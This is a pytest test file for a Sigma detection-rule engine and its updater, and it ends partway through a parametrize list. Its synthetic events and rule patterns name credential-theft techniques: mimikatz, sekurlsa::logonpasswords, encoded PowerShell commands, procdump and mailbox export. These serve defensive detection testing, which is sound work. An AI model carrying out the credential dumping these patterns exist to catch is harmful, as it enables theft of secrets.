"""Tests for the Sigma rule engine (aegis.core.sigma), its updater (aegis.tools.sigma_update) and the eventlog /
ProcessGuard integrations. Everything runs on synthetic events and mocked downloads, on any OS. Skipped when
PyYAML (the optional 'sigma' extra) is not installed."""

from __future__ import annotations

import base64
import io
import json
import sys
import time
import urllib.error
import zipfile
from pathlib import Path
from types import SimpleNamespace

import pytest

from aegis.core import sigma as S
from aegis.core.config import Config
from aegis.core.models import CheckResult, CheckStatus, Finding, Severity
from aegis.realtime import monitor as M
from aegis.scanners import eventlog as el
from aegis.tools import sigma_update as U

yaml = S._yaml()  # None when PyYAML is missing: the autouse fixture below then skips the tests that need it


@pytest.fixture(autouse=True)
def _hermetic(monkeypatch):
    """No test may read (or write) machine-wide state: the Windows %ProgramData% signatures dir is switched off."""
    import aegis.core.config as config_mod

    monkeypatch.setattr(config_mod, "shared_signatures_dir", lambda: None)


@pytest.fixture
def no_sigma_module(monkeypatch):
    """Simulate an installation without aegis/core/sigma.py: `from aegis.core import sigma` raises ImportError."""
    import aegis.core as core_pkg

    monkeypatch.delattr(core_pkg, "sigma", raising=False)
    monkeypatch.setitem(sys.modules, "aegis.core.sigma", None)


@pytest.fixture(autouse=True)
def _need_yaml(request):
    """Everything here needs PyYAML except the tests that simulate its absence."""
    if not S.available() and not request.node.name.startswith("test_unavailable"):
        pytest.skip("PyYAML is not installed (pip install pyyaml)")


# --------------------------------------------------------------------------- helpers

def make_rule(detection, logsource=None, **meta):
    """Compile a rule from a detection dict (no YAML involved)."""
    doc = {"title": meta.pop("title", "Test rule"), "id": meta.pop("id", "00000000-1111-2222-3333-444444444444"),
           "status": meta.pop("status", "stable"), "level": meta.pop("level", "high"),
           "logsource": logsource or {"category": "process_creation", "product": "windows"}, "detection": detection}
    doc.update(meta)
    return S.rule_from_dict(doc)


def fires(detection, event, **kw):
    """True if a one-rule rule set matches the event (logsource routing bypassed unless the event routes itself)."""
    rule = make_rule(detection, **kw)
    return bool(S.SigmaRuleSet([rule]).match(event, ignore_logsource=True))


def sel(**fields):
    return {"selection": fields, "condition": "selection"}


def pc(**fields):
    fields.setdefault("_category", "process_creation")
    return fields


def rule_yaml(body: str, title: str = "T", rid: str = "11111111-2222-3333-4444-555555555555") -> str:
    return (f"title: {title}\nid: {rid}\nstatus: stable\nlevel: high\nlogsource:\n  category: process_creation\n"
            f"  product: windows\ndetection:\n{body}\n")


def parse_one(text: str):
    rules, skipped = S.parse_rules_text(text, "mem.yml")
    return rules, skipped


# =========================================================================== availability / loading

def test_unavailable_without_pyyaml(monkeypatch, tmp_path):
    monkeypatch.setattr(S, "_yaml", lambda: None)
    assert not S.available()
    rs = S.load_rules(None)
    assert not rs.available and len(rs) == 0 and not rs and "PyYAML" in rs.reason
    assert rs.match({"Image": "x", "_category": "process_creation"}) == []
    assert S.sigma_findings([{"Image": "x"}], rs) == []
    assert S.evaluate([{"Image": "x"}], rs).events == 0
    r, s = S.parse_rules_text("title: x", "m.yml")
    assert r == [] and s and s[0].kind == "invalid"
    res = S.test_rule_on_events(tmp_path / "r.yml", tmp_path / "e.json")
    assert not res["ok"] and "PyYAML" in res["error"]


def test_unavailable_updater_and_scanner_skip_gracefully(monkeypatch, tmp_path):
    monkeypatch.setattr(S, "_yaml", lambda: None)
    out = U.update_sigma_rules(SimpleNamespace(signatures_dir=tmp_path))
    assert out["sigma"]["ok"] is False and out["sigma"]["skipped"] is True and "PyYAML" in out["sigma"]["error"]
    found, info = el.sigma_hunt({"security": [el.make_event(1102, "Security", 1.0)]}, None)
    assert found == [] and info["status"] == "unavailable"


def test_bundled_rules_load_cleanly():
    rs = S.load_rules(None)
    assert rs.available and len(rs) >= 10
    assert rs.skipped == [], rs.skipped
    assert {r.origin for r in rs.rules} == {"bundled"}


def test_load_rules_reads_bundled_downloaded_and_custom(tmp_path):
    cfg = SimpleNamespace(signatures_dir=tmp_path)
    base = len(S.load_rules(None))
    (tmp_path / "sigma" / "sub").mkdir(parents=True)
    (tmp_path / "sigma_custom").mkdir()
    (tmp_path / "sigma" / "sub" / "a.yml").write_text(rule_yaml("  s:\n    Image|endswith: '\\a.exe'\n  condition: s",
                                                                "Downloaded", "aaaaaaaa-0000-0000-0000-000000000001"))
    (tmp_path / "sigma_custom" / "b.yaml").write_text(rule_yaml("  s:\n    Image|endswith: '\\b.exe'\n  condition: s",
                                                                "Custom", "bbbbbbbb-0000-0000-0000-000000000002"))
    (tmp_path / "sigma_custom" / "notes.txt").write_text("ignored")
    rs = S.load_rules(cfg)
    assert len(rs) == base + 2
    assert {r.title: r.origin for r in rs.rules if r.title in ("Downloaded", "Custom")} == {
        "Downloaded": "downloaded", "Custom": "custom"}
    assert len(S.load_rules(cfg, include_bundled=False)) == 2
    only_pc = S.load_rules(cfg, categories=("process_creation",))
    assert only_pc.rules and all(r.category == "process_creation" for r in only_pc.rules)
    assert [d.name for d, _ in S.rule_directories(cfg)][-2:] == ["sigma", "sigma_custom"]


def test_category_filter_keeps_only_wanted_logsources_without_noise():
    pc_doc = rule_yaml("  s:\n    Image: a\n  condition: s", "PC", "00000021-0000-0000-0000-000000000000")
    reg_doc = pc_doc.replace("category: process_creation", "category: registry_set").replace("PC", "REG").replace("00000021", "00000022")
    flow = ("title: Flow\nid: 00000023-0000-0000-0000-000000000000\nlogsource: {product: windows, category: process_creation}\n"
            "detection: {s: {Image: a}, condition: s}\n")
    svc = "title: Svc\nlogsource: {product: windows, service: security}\ndetection: {s: {EventID: 1}, condition: s}\n"
    rules, skipped = S.parse_rules_text(pc_doc + "---\n" + reg_doc, "m.yml", categories=["process_creation"])
    assert [r.title for r in rules] == ["PC"] and skipped == []
    assert [r.title for r in S.parse_rules_text(flow, "m.yml", categories=["process_creation"])[0]] == ["Flow"]
    assert S.parse_rules_text(reg_doc, "m.yml", categories=["process_creation"]) == ([], [])  # not even parsed
    assert S.parse_rules_text(svc, "m.yml", categories=["process_creation"]) == ([], [])
    assert S.parse_rules_text("title: [broken", "m.yml", categories=["process_creation"]) == ([], [])  # unparsed: nothing to report
    assert len(S.parse_rules_text(reg_doc, "m.yml", categories=["registry_set", "process_creation"])[0]) == 1


def test_later_rule_with_same_id_overrides_earlier(tmp_path):
    cfg = SimpleNamespace(signatures_dir=tmp_path)
    bundled = S.load_rules(None).rules[0]
    (tmp_path / "sigma").mkdir()
    (tmp_path / "sigma" / "o.yml").write_text(
        rule_yaml("  s:\n    Image|endswith: '\\o.exe'\n  condition: s", "Override", bundled.id))
    rs = S.load_rules(cfg)
    assert rs.get(bundled.id).title == "Override" and rs.get(bundled.id).origin == "downloaded"
    assert len(rs) == len(S.load_rules(None))


def test_rules_signature_changes_when_rules_change(tmp_path):
    cfg = SimpleNamespace(signatures_dir=tmp_path)
    before = S.rules_signature(cfg)
    (tmp_path / "sigma_custom").mkdir()
    f = tmp_path / "sigma_custom" / "x.yml"
    f.write_text("title: x")
    mid = S.rules_signature(cfg)
    assert mid != before
    assert S.load_rules(cfg).signature == mid
    time.sleep(0.02)
    f.write_text("title: y")
    import os
    os.utime(f, (time.time() + 5, time.time() + 5))
    assert S.rules_signature(cfg) != mid


# =========================================================================== metadata -> rule -> finding

FULL_RULE = """\
title: Encoded thing
id: 0a1b2c3d-1111-2222-3333-444455556666
status: experimental
description: >
  Something   suspicious
  happened.
references:
  - https://example.org/ref1
author: Someone
date: 2026/10/16
tags:
  - attack.execution
  - attack.t1059.001
  - attack.T1027
  - attack.s0002
  - attack.t1562.001
  - attack.t1059.001
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\\evil.exe'
  condition: selection
falsepositives:
  - Unknown
  - Admin scripts.
level: high
"""


def test_parse_metadata_and_finding_fields():
    (rule,), skipped = parse_one(FULL_RULE)
    assert not skipped
    assert rule.title == "Encoded thing" and rule.description == "Something suspicious happened."
    assert rule.rule_id == "SIGMA-0a1b2c3d" and rule.id.startswith("0a1b2c3d")
    assert rule.mitre == ["T1059.001", "T1027", "T1685"]  # tactic/software tags ignored, retired id mapped, no dupes
    assert (rule.product, rule.category, rule.service) == ("windows", "process_creation", "")
    assert rule.severity == Severity.MEDIUM  # experimental: high -> medium
    ev = pc(Image=r"C:\x\evil.exe", CommandLine="evil.exe -x", User="PC\\bob", _log="Sysmon", _event_id=1, _ts=1.8e9)
    ((r, matched),) = S.SigmaRuleSet([rule]).match(ev)
    f = S.finding_for_match(r, matched, ev)
    assert f.rule_id == "SIGMA-0a1b2c3d" and f.title == "Sigma: Encoded thing" and f.severity == Severity.MEDIUM
    assert f.mitre == ["T1059.001", "T1027", "T1685"] and f.category == "malware"  # attack.s0002 software tag
    assert "Something suspicious happened." in f.description and "Sigma rule" in f.description
    assert "Admin scripts" in f.recommendation and "Unknown" not in f.recommendation
    e = f.evidence
    assert e["source"] == "sigma" and e["sigma_rule_id"] == rule.id and e["sigma_level"] == "high"
    assert e["sigma_status"] == "experimental" and e["references"] == ["https://example.org/ref1"]
    assert e["matched"] == {"Image": r"C:\x\evil.exe"} and e["event"]["CommandLine"] == "evil.exe -x"
    assert e["log"] == "Sysmon" and e["event_id"] == 1 and e["time"].endswith("UTC")
    json.dumps(f.to_dict())  # fully serialisable


@pytest.mark.parametrize("tag,expected", [
    ("attack.t1059.001", "T1059.001"), ("attack.T1059", "T1059"), ("ATTACK.t1003.001", "T1003.001"),
    ("attack.execution", None), ("attack.s0002", None), ("attack.g0016", None), ("cve.2021-44228", None),
    ("attack.t10", None), ("attack.t1059.1", None), ("attack.t1562.001", "T1685"), ("attack.t1070.001", "T1685.005"),
    ("attack.t1574.002", "T1574.001"), ("attack.t1656", "T1684.001"), ("attack.t1562.004", "T1686"),
])
def test_attack_id_normalisation(tag, expected):
    assert S.attack_ids_from_tags([tag]) == ([expected] if expected else [])


@pytest.mark.parametrize("level,status,expected", [
    ("informational", "stable", Severity.INFO), ("low", "stable", Severity.LOW), ("medium", "stable", Severity.MEDIUM),
    ("high", "stable", Severity.HIGH), ("critical", "stable", Severity.CRITICAL), ("critical", "test", Severity.HIGH),
    ("high", "experimental", Severity.MEDIUM), ("medium", "test", Severity.LOW), ("low", "experimental", Severity.INFO),
    ("informational", "test", Severity.INFO), ("", "stable", Severity.LOW), ("weird", "stable", Severity.LOW),
    ("HIGH", "Stable", Severity.HIGH), ("high", "", Severity.HIGH),
])
def test_level_to_severity(level, status, expected):
    assert S.level_to_severity(level, status) == expected


def test_category_mapping():
    persist = make_rule(sel(Image="x"), tags=["attack.persistence", "attack.t1547.001"])
    malware = make_rule(sel(Image="x"), tags=["attack.s0002"])
    emerging = make_rule(sel(Image="x"), tags=["detection.emerging_threats"])
    plain = make_rule(sel(Image="x"), tags=["attack.execution"])
    ev = {"Image": "x"}
    assert [S.finding_for_match(r, {}, ev).category for r in (persist, malware, emerging, plain)] == [
        "persistence", "malware", "malware", "suspicious"]


def test_multi_document_file_and_deprecated_status():
    text = (rule_yaml("  s:\n    Image: a\n  condition: s", "One", "00000001-0000-0000-0000-000000000000")
            + "---\n"
            + rule_yaml("  s:\n    Image: b\n  condition: s", "Two", "00000002-0000-0000-0000-000000000000")
            + "---\n"
            + rule_yaml("  s:\n    Image: c\n  condition: s", "Old", "00000003-0000-0000-0000-000000000000").replace(
                "status: stable", "status: deprecated"))
    rules, skipped = parse_one(text)
    assert [r.title for r in rules] == ["One", "Two"]
    assert [(s.title, s.kind) for s in skipped] == [("Old", "status")]


@pytest.mark.parametrize("text,kind", [
    ("title: x\nlogsource: {category: process_creation}\n", "invalid"),  # no detection
    ("logsource: {category: process_creation}\ndetection: {s: {Image: a}, condition: s}\n", "invalid"),  # no title
    ("title: x\ndetection: {s: {Image: a}, condition: s}\n", "invalid"),  # no logsource
    ("title: x\nlogsource: {category: c}\ndetection: {s: {Image: a}}\n", "invalid"),  # no condition
    ("title: x\nlogsource: {category: c}\ndetection: {condition: s}\n", "invalid"),  # no selections
    ("title: x\nlogsource: {category: c}\ndetection: {s: {Image: a}, condition: t}\n", "invalid"),  # unknown selection
    ("title: x\nlogsource: {category: c}\ndetection: {s: {Image: a}, condition: 1 of foo*}\n", "invalid"),
    ("title: x\nlogsource: {category: c}\ndetection: {s: {Image: a}, condition: (s}\n", "invalid"),
    ("title: x\nlogsource: {category: c}\ndetection: {s: {Image: a}, condition: s and}\n", "invalid"),
    ("title: x\nlogsource: {category: c}\ndetection: {s: {Image: a}, condition: s s}\n", "invalid"),
    ("title: x\nlogsource: {category: c}\ndetection: {s: {}, condition: s}\n", "invalid"),  # empty selection
    ("title: x\nlogsource: {category: c}\ndetection: {s: {Image: [{a: b}]}, condition: s}\n", "invalid"),
    ("title: x: y: z\n  bad: [", "invalid"),  # broken YAML
    ("- just\n- a list\n", "invalid"),
    ("title: x\nlogsource: {category: c}\ndetection: {s: {'Image|cidr': 'not-a-network'}, condition: s}\n", "invalid"),
])
def test_invalid_rules_are_skipped_not_raised(text, kind):
    rules, skipped = parse_one(text)
    assert rules == [] and len(skipped) == 1 and skipped[0].kind == kind and skipped[0].reason


@pytest.mark.parametrize("text,needle", [
    ("title: x\nlogsource: {category: c}\ndetection: {s: {Image: a}, condition: 's | count() > 3'}\n", "aggregation"),
    ("title: x\nlogsource: {category: c}\ndetection: {s: {Image: a}, t: {Image: b}, condition: 's | near t'}\n", "aggregation"),
    ("title: x\nlogsource: {category: c}\ndetection: {s: {Image: a}, t: {Image: b}, condition: s near t}\n", "near"),
    ("title: x\nlogsource: {category: c}\ndetection: {s: {'Image|bogus': a}, condition: s}\n", "unknown modifier"),
    ("title: x\nlogsource: {category: c}\ndetection: {s: {'Image|expand': '%x%'}, condition: s}\n", "expand"),
    ("title: x\nlogsource: {category: c}\ndetection: {s: {'Image|contains|endswith': a}, condition: s}\n", "conflicting"),
    ("title: x\nlogsource: {category: c}\ndetection: {s: {'Image|re': '(unclosed'}, condition: s}\n", "regular expression"),
    ("title: x\nlogsource: {category: c}\ndetection: {s: {'Image|utf16le': a}, condition: s}\n", "base64"),
    ("title: x\nlogsource: {category: c}\ndetection: {s: {'Image|i': a}, condition: s}\n", "re"),
    ("title: x\nlogsource: {category: c}\ndetection: {s: [{Image: a}, keyword], condition: s}\n", "mixes"),
    ("title: corr\ncorrelation: {type: event_count, rules: [x], group-by: [a], timespan: 1h, condition: {gte: 5}}\n", "correlation"),
    ("title: x\naction: global\nlogsource: {category: c}\ndetection: {s: {Image: a}, condition: s}\n", "collection"),
    ("title: x\nfilter: {rules: [abc], selection: {Image: a}, condition: selection}\n", "filter"),
])
def test_unsupported_rules_are_counted_never_raised(text, needle):
    rules, skipped = parse_one(text)
    assert rules == [] and len(skipped) == 1
    assert skipped[0].kind == "unsupported" and needle in skipped[0].reason


def test_unsupported_rules_do_not_stop_loading_and_are_summarised(tmp_path):
    d = tmp_path / "sigma_custom"
    d.mkdir()
    (d / "good.yml").write_text(rule_yaml("  s:\n    Image: a\n  condition: s", "Good", "00000009-0000-0000-0000-000000000000"))
    (d / "agg.yml").write_text(rule_yaml("  s:\n    Image: a\n  condition: s | count() > 5\n", "Agg"))
    (d / "bad.yml").write_text("title: [unterminated")
    (d / "mod.yml").write_text(rule_yaml("  s:\n    Image|nope: a\n  condition: s", "Mod"))
    rs = S.load_rules(SimpleNamespace(signatures_dir=tmp_path), include_bundled=False)
    assert [r.title for r in rs.rules] == ["Good"]
    summary = rs.summary()
    assert summary["unsupported"] == 2 and summary["skipped"] == {"unsupported": 2, "invalid": 1}


def test_oversized_and_unreadable_rule_files(tmp_path):
    big = tmp_path / "big.yml"
    big.write_text("title: x\n" + "# pad\n" * (S.MAX_RULE_FILE_BYTES // 6 + 10))
    rules, skipped = S.load_rule_file(big)
    assert rules == [] and skipped[0].reason == "file too large"
    rules, skipped = S.load_rule_file(tmp_path / "missing.yml")
    assert rules == [] and "cannot read" in skipped[0].reason


# =========================================================================== value semantics

def test_default_match_is_exact_and_case_insensitive():
    d = sel(Image=r"C:\Windows\System32\cmd.exe")
    assert fires(d, {"Image": r"c:\WINDOWS\system32\CMD.EXE"})
    assert not fires(d, {"Image": r"C:\Windows\System32\cmd.exe "})
    assert not fires(d, {"Image": r"X:\C:\Windows\System32\cmd.exe"})
    assert not fires(d, {"Other": "cmd.exe"})  # field missing


def test_unicode_case_insensitivity():
    assert fires(sel(CommandLine="ÄÖÜ straße"), {"CommandLine": "äöü STRASSE".replace("STRASSE", "straße")})
    assert fires(sel(**{"CommandLine|contains": "ÉCOLE"}), {"CommandLine": "x école y"})


def test_contains_startswith_endswith():
    assert fires(sel(**{"CommandLine|contains": " -enc "}), {"CommandLine": "powershell -ENC abc"})
    assert not fires(sel(**{"CommandLine|contains": " -enc "}), {"CommandLine": "powershell -encx abc"})
    assert fires(sel(**{"Image|startswith": "C:\\Users\\"}), {"Image": "c:\\users\\bob\\a.exe"})
    assert not fires(sel(**{"Image|startswith": "C:\\Users\\"}), {"Image": "D:\\C:\\Users\\a.exe"})
    assert fires(sel(**{"Image|endswith": "\\cmd.exe"}), {"Image": "C:\\Windows\\System32\\CMD.EXE"})
    assert not fires(sel(**{"Image|endswith": "\\cmd.exe"}), {"Image": "C:\\cmd.exe.bak"})


def test_list_values_are_or_and_all_is_and():
    d = sel(**{"CommandLine|contains": ["alpha", "beta"]})
    assert fires(d, {"CommandLine": "xx beta"}) and fires(d, {"CommandLine": "alpha"}) and not fires(d, {"CommandLine": "gamma"})
    d = sel(**{"CommandLine|contains|all": ["alpha", "beta"]})
    assert fires(d, {"CommandLine": "beta then alpha"}) and not fires(d, {"CommandLine": "only alpha"})
    d = sel(**{"CommandLine|all": ["alpha"]})  # 'all' on a single equals value
    assert fires(d, {"CommandLine": "ALPHA"})
    d = sel(**{"Image|endswith": ["\\a.exe", "\\b.exe"], "CommandLine|contains": "x"})  # fields AND, values OR
    assert fires(d, {"Image": "c:\\b.exe", "CommandLine": "x"}) and not fires(d, {"Image": "c:\\b.exe", "CommandLine": "y"})


def test_wildcards_star_and_question_mark():
    assert fires(sel(CommandLine="cmd.exe /c *"), {"CommandLine": "CMD.EXE /C whoami /all"})
    assert fires(sel(CommandLine="a?c"), {"CommandLine": "ABC"})
    assert not fires(sel(CommandLine="a?c"), {"CommandLine": "ac"})
    assert not fires(sel(CommandLine="a?c"), {"CommandLine": "abbc"})
    assert fires(sel(CommandLine="*mid*"), {"CommandLine": "xxMIDyy"})
    assert fires(sel(CommandLine="start*end"), {"CommandLine": "start--middle--end"})
    assert not fires(sel(CommandLine="start*end"), {"CommandLine": "start-middle-ending"})
    assert fires(sel(**{"CommandLine|contains": "a*b"}), {"CommandLine": "__a---b__"})  # wildcard inside contains
    assert fires(sel(**{"CommandLine|startswith": "a?c*"}), {"CommandLine": "abcdef"})
    assert fires(sel(**{"CommandLine|endswith": "*.exe"}), {"CommandLine": "foo.exe"})
    assert fires(sel(CommandLine="*"), {"CommandLine": "anything"}) and fires(sel(CommandLine="*"), {"CommandLine": ""})
    assert fires(sel(CommandLine="line1*line2"), {"CommandLine": "LINE1\r\nLINE2"})  # * crosses newlines


def test_wildcard_escaping_and_literal_backslashes():
    assert fires(sel(CommandLine=r"a\*b"), {"CommandLine": "a*b"})  # escaped star is literal
    assert not fires(sel(CommandLine=r"a\*b"), {"CommandLine": "axb"})
    assert fires(sel(CommandLine=r"a\?b"), {"CommandLine": "a?b"}) and not fires(sel(CommandLine=r"a\?b"), {"CommandLine": "axb"})
    assert fires(sel(CommandLine="C:\\\\*"), {"CommandLine": "C:\\anything"})  # \\* = backslash + wildcard
    assert fires(sel(**{"CommandLine|contains": r"\\\\server\\share"}), {"CommandLine": r"dir \\server\share\x"})  # \\ -> \
    assert fires(sel(**{"Image|endswith": r"\cmd.exe"}), {"Image": r"C:\Windows\System32\cmd.exe"})  # lone \ is literal
    assert S.parse_pattern(r"\\\\\?\\GLOBALROOT") == [r"\\?\GLOBALROOT"]
    assert S.parse_pattern("a**b?") == ["a", S._STAR, "b", S._QMARK]


def test_regex_metacharacters_in_plain_values_are_literal():
    assert fires(sel(**{"CommandLine|contains": "a.b(c)+[d]"}), {"CommandLine": "xx A.B(C)+[D] yy"})
    assert not fires(sel(**{"CommandLine|contains": "a.b"}), {"CommandLine": "axb"})
    assert fires(sel(CommandLine="a.b*"), {"CommandLine": "a.bcd"}) and not fires(sel(CommandLine="a.b*"), {"CommandLine": "axbcd"})


def test_regex_modifier_is_case_sensitive_search_with_flags():
    assert fires(sel(**{"CommandLine|re": r"evil\d+"}), {"CommandLine": "run evil42 now"})
    assert not fires(sel(**{"CommandLine|re": r"evil\d+"}), {"CommandLine": "run EVIL42 now"})  # case sensitive
    assert fires(sel(**{"CommandLine|re": r"(?i)evil\d+"}), {"CommandLine": "run EVIL42 now"})
    assert fires(sel(**{"CommandLine|re|i": r"evil\d+"}), {"CommandLine": "run EVIL42 now"})
    assert not fires(sel(**{"CommandLine|re": r"^evil"}), {"CommandLine": "x evil"})  # anchors are the author's choice
    assert fires(sel(**{"CommandLine|re|m": r"^evil"}), {"CommandLine": "x\nevil"})
    assert fires(sel(**{"CommandLine|re|s": r"a.b"}), {"CommandLine": "a\nb"})
    assert not fires(sel(**{"CommandLine|re": r"a.b"}), {"CommandLine": "a\nb"})
    assert fires(sel(**{"CommandLine|re": [r"zzz", r"abc"]}), {"CommandLine": "xabcx"})  # list is OR
    assert fires(sel(**{"CommandLine|re": r"\\foo\.exe$"}), {"CommandLine": r"C:\bar\foo.exe"})


def test_cidr_modifier():
    d = sel(**{"DestinationIp|cidr": ["10.0.0.0/8", "192.168.1.0/24", "fe80::/10"]})
    assert fires(d, {"DestinationIp": "10.2.3.4"}) and fires(d, {"DestinationIp": "192.168.1.77"})
    assert fires(d, {"DestinationIp": "fe80::1"}) and fires(d, {"DestinationIp": "::ffff:10.1.1.1"})
    assert not fires(d, {"DestinationIp": "192.168.2.1"}) and not fires(d, {"DestinationIp": "8.8.8.8"})
    assert not fires(d, {"DestinationIp": "not an ip"}) and not fires(d, {"DestinationIp": ""})
    assert fires(sel(**{"DestinationIp|cidr": "203.0.113.5"}), {"DestinationIp": "203.0.113.5"})  # bare address = /32


def test_windash_modifier():
    d = sel(**{"CommandLine|contains|windash": " -enc "})
    for variant in (" -enc ", " /enc ", " \u2013enc ", " \u2014enc ", " \u2015enc "):
        assert fires(d, {"CommandLine": f"powershell{variant}AAAA"}), variant
    assert not fires(d, {"CommandLine": "powershell -nop"})
    # a rule written with '/' also matches '-' (SigmaHQ authors use both spellings)
    d = sel(**{"CommandLine|contains|windash": " /accepteula"})
    assert fires(d, {"CommandLine": "procdump -accepteula x"}) and fires(d, {"CommandLine": "procdump /ACCEPTEULA x"})
    assert fires(d, {"CommandLine": "procdump \u2013accepteula x"})
    # only switch-leading dashes are varied, never the ones inside words
    assert S.windash_variants("Invoke-Expression") == ["Invoke-Expression"]
    assert S.windash_variants("a/b -c") == ["a/b -c", "a/b /c", "a/b \u2013c", "a/b \u2014c", "a/b \u2015c"]
    assert S.windash_variants("--no-check-certificate")[:2] == ["--no-check-certificate", "-/no-check-certificate"]
    assert not fires(sel(**{"CommandLine|contains|windash": "Invoke-Expression"}), {"CommandLine": "Invoke/Expression"})
    assert fires(sel(**{"CommandLine|contains|windash": "-w hidden"}), {"CommandLine": "ps /w hidden"})  # at string start
    assert S.windash_variants("plain") == ["plain"]
    # several switches in one value combine (pySigma: up to three positions)
    two = S.windash_variants(" -s -i cmd")
    assert len(two) == 25 and " /s \u2014i cmd" in two and " -s -i cmd" in two
    many = S.windash_variants("-a -b -c -d -e")
    assert len(many) == 5 ** S.MAX_WINDASH_EXPANSIONS and all(v.endswith(" -d -e") for v in many)


def test_exists_modifier():
    assert fires(sel(**{"ParentImage|exists": True}), {"ParentImage": "x"})
    assert not fires(sel(**{"ParentImage|exists": True}), {"Image": "x"})
    assert fires(sel(**{"ParentImage|exists": False}), {"Image": "x"})
    assert not fires(sel(**{"ParentImage|exists": False}), {"ParentImage": "x"})
    assert fires(sel(**{"ParentImage|exists": "true"}), {"parentimage": "x"})  # field names are case-insensitive


def test_null_matches_missing_or_empty():
    d = sel(ParentImage=None)
    assert fires(d, {"Image": "x"}) and fires(d, {"ParentImage": ""}) and fires(d, {"ParentImage": None})
    assert not fires(d, {"ParentImage": "x"})
    d = sel(ParentImage=[None, "explorer.exe"])  # null or a value
    assert fires(d, {"Image": "x"}) and fires(d, {"ParentImage": "EXPLORER.EXE"}) and not fires(d, {"ParentImage": "cmd.exe"})
    d = {"s": {"Image|endswith": "\\a.exe"}, "f": {"ParentImage": None}, "condition": "s and not f"}
    assert fires(d, {"Image": "c:\\a.exe", "ParentImage": "p.exe"}) and not fires(d, {"Image": "c:\\a.exe"})


def test_cased_modifier():
    assert fires(sel(**{"CommandLine|contains|cased": "ABC"}), {"CommandLine": "xABCx"})
    assert not fires(sel(**{"CommandLine|contains|cased": "ABC"}), {"CommandLine": "xabcx"})
    assert fires(sel(**{"Image|cased": "A.exe"}), {"Image": "A.exe"}) and not fires(sel(**{"Image|cased": "A.exe"}), {"Image": "a.exe"})


@pytest.mark.parametrize("prefix,suffix", [("", ""), ("x", ""), ("xy", "z"), ("xyz", "yy"), ("; ", " tail")])
def test_base64offset_matches_at_every_alignment(prefix, suffix):
    value = "Invoke-Mimikatz"
    blob = base64.b64encode((prefix + value + suffix).encode()).decode()
    d = sel(**{"CommandLine|base64offset|contains": value})
    assert fires(d, {"CommandLine": f"powershell -enc {blob}"})
    assert not fires(d, {"CommandLine": "powershell -enc " + base64.b64encode(b"Get-Date").decode()})
    assert any(v in base64.b64encode((prefix + value + suffix).encode()).decode() for v in S.base64_offset_variants(value.encode()))


def test_base64_is_case_sensitive_and_utf16le_encodes_powershell_style():
    b64 = base64.b64encode("whoami".encode("utf-16-le")).decode()
    d = sel(**{"CommandLine|utf16le|base64offset|contains": "whoami"})
    assert fires(d, {"CommandLine": f"powershell -enc {b64}"})
    assert not fires(d, {"CommandLine": f"powershell -enc {b64.lower()}"}) or b64 == b64.lower()
    assert fires(sel(**{"Data|base64": "hello"}), {"Data": "aGVsbG8="})
    assert not fires(sel(**{"Data|base64": "hello"}), {"Data": "AGVSBG8="})
    assert fires(sel(**{"Data|wide|base64offset|contains": "hi"}), {"Data": "zz" + base64.b64encode("hi".encode("utf-16-le")).decode()})


def test_fieldref_and_numeric_comparisons():
    assert fires(sel(**{"Image|fieldref": "ParentImage"}), {"Image": "A.exe", "ParentImage": "a.EXE"})
    assert not fires(sel(**{"Image|fieldref": "ParentImage"}), {"Image": "a.exe", "ParentImage": "b.exe"})
    assert not fires(sel(**{"Image|fieldref": "ParentImage"}), {"Image": "a.exe"})
    assert fires(sel(**{"DestinationPort|gte": 1024}), {"DestinationPort": "8080"})
    assert fires(sel(**{"DestinationPort|lt": 1024}), {"DestinationPort": 443})
    assert not fires(sel(**{"DestinationPort|gt": 1024}), {"DestinationPort": "443"})
    assert fires(sel(**{"DestinationPort|lte": 443}), {"DestinationPort": "443"}) and not fires(
        sel(**{"DestinationPort|lte": 443}), {"DestinationPort": "abc"})
    assert fires(sel(**{"DestinationPort|gt": 100}), {"DestinationPort": "0x1F4"})  # hex strings compare numerically


def test_numbers_booleans_and_list_valued_event_fields():
    assert fires(sel(EventID=4688), {"EventID": "4688"}) and fires(sel(EventID=4688), {"EventID": 4688})
    assert fires(sel(EventID=[1, 3]), {"EventID": "3"}) and not fires(sel(EventID=[1, 3]), {"EventID": "2"})
    assert fires(sel(Initiated=True), {"Initiated": "true"}) and fires(sel(Initiated="true"), {"Initiated": True})
    assert fires(sel(Initiated=False), {"Initiated": "False"})
    d = sel(**{"Tags|contains": "bad"})
    assert fires(d, {"Tags": ["ok", "very BAD"]}) and not fires(d, {"Tags": ["ok", "fine"]})
    assert not fires(d, {"Tags": []})


def test_field_names_are_case_insensitive_and_underscore_keys_are_hidden():
    assert fires(sel(CommandLine="x"), {"commandline": "x"})
    assert not fires(sel(_category="process_creation"), {"_category": "process_creation"})  # metadata is not matchable
    assert not fires({"s": ["process_creation"], "condition": "s"}, {"_category": "process_creation"})  # nor searchable


def test_keyword_selections_search_every_field():
    d = {"keywords": ["mimikatz", "sekurlsa::*"], "condition": "keywords"}
    assert fires(d, {"Image": "x", "CommandLine": "run MIMIKATZ now"})
    assert fires(d, {"ScriptBlockText": "sekurlsa::logonpasswords"})
    assert not fires(d, {"Image": "benign", "CommandLine": "calc"})
    d = {"kw": {"|all": ["new-mailboxexportrequest", " -mailbox "]}, "condition": "kw"}  # field-less map, all values
    assert fires(d, {"Message": "New-MailboxExportRequest -Mailbox bob -FilePath x"})
    assert not fires(d, {"Message": "New-MailboxExportRequest only"})
    d = {"kw": {"|re": "evil\\d+"}, "condition": "kw"}
    assert fires(d, {"A": "x", "B": "evil7"}) and not fires(d, {"A": "EVIL7"})
    assert fires({"kw": "single-keyword", "condition": "kw"}, {"A": "has SINGLE-keyword inside"})  # scalar keyword


def test_huge_event_values_are_truncated_not_fatal():
    big = "A" * (S.MAX_FIELD_CHARS * 3) + "needle"
    assert not fires(sel(**{"CommandLine|contains": "needle"}), {"CommandLine": big})  # beyond the cap: not searched
    assert fires(sel(**{"CommandLine|contains": "aaa"}), {"CommandLine": big})
    assert fires(sel(**{"CommandLine|re": "A{10}"}), {"CommandLine": big})


# =========================================================================== conditions

def cond(condition, selections, event, **kw):
    d = dict(selections)
    d["condition"] = condition
    return fires(d, event, **kw)


A, B, C = {"Image": "a"}, {"Image": "b"}, {"Image": "c"}
SELS = {"sa": A, "sb": B, "sc": C}


@pytest.mark.parametrize("condition,image,expected", [
    ("sa", "a", True), ("sa", "b", False),
    ("sa or sb", "b", True), ("sa or sb", "c", False),
    ("sa and sb", "a", False),
    ("not sa", "b", True), ("not sa", "a", False),
    ("not not sa", "a", True),
